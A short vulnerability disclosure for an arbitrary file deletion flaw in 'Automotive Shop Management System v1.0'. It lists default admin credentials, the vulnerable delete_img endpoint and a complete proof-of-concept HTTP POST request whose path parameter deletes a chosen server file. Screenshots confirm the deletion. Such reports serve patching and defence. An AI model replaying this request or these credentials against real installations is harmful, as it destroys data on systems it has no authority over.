# Automotive Shop Management System v1.0 by oretnom23 has Delete any file

BUG_Author: tpaer

Login account: admin/admin123 (Super Admin account)

vendors: https://www.sourcecodester.com/php/15312/automotive-shop-management-system-phpoop-free-source-code.html

Vulnerability File: /asms/classes/Master.php?f=delete_img

Vulnerability location: /asms/classes/Master.php?f=delete_img, path

Payload:

```sql
POST /asms/classes/Master.php?f=delete_img HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.88/asms/admin/?page=system_info
Content-Length: 64
Cookie: __utma=78021076.1353699714.1665838696.1665838696.1665838696.1; __utmz=78021076.1665838696.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gauges_unique_month=1; _gauges_unique_year=1; _gauges_unique=1; PHPSESSID=ocll92n082l6eedlf8jugi8i1r
Connection: close

path=C%3A%2Fxampp%2Fhtdocs%2Fasms%2Fuploads%2Fbanner%2Fshell.php
```

Here we delete the shel.php file in the  directory

Currently, when we do not send a request to delete the shell.php file, the shell.php file is still in the  directory of the website


![image](https://user-images.githubusercontent.com/54017627/197347413-170d90a2-7e8a-4b0b-ba00-5619c4b9e9da.png)

The response package shows that the deletion was successful. Let's go to the directory to see if the shell.php file still exists.
![image](https://user-images.githubusercontent.com/54017627/197347489-7c8f8425-ab6f-4b23-b259-e85c6a0931f3.png)

By this time, shell.php has been deleted.

![image](https://user-images.githubusercontent.com/54017627/197347526-65cda818-05ff-4223-bc73-1f247b636d44.png)

